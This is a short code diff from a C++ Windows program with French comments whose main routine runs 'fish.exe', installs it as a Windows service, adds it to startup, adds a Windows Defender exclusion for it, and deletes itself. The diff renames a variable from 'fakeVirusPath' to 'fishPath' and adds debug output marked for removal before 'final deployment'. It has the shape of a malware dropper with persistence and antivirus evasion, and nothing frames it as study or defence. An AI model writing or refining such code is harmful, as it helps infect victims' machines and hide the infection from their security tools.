@@ -193,20 +193,23 @@ int main() {
         }
     }
 
-    // Lancer FakeVirus.exe
-    string fakeVirusPath = fishFolder + "\\fish.exe";
-    ExecuteFile(fakeVirusPath);
+    // Lancer fish.exe
+    string fishPath = fishFolder + "\\fish.exe";
+    ExecuteFile(fishPath);
 
     // Installer le service Windows
-    InstallService("fish", fakeVirusPath);
+    InstallService("fish", fishPath);
 
     // Ajouter au démarrage
     AddToStartup();
 
-    cout << fakeVirusPath << endl;
+    // Bloc de debug à supprimer au déploiement final
+    cout << fishPath << endl;
+    cout << userFolder << endl;
+    cout << fishFolder << endl;
 
     // Ajouter une exclusion antivirus
-    AddDefenderExclusion(fakeVirusPath);
+    AddDefenderExclusion(fishPath);
 
     // S'auto-supprimer
     SelfDelete();
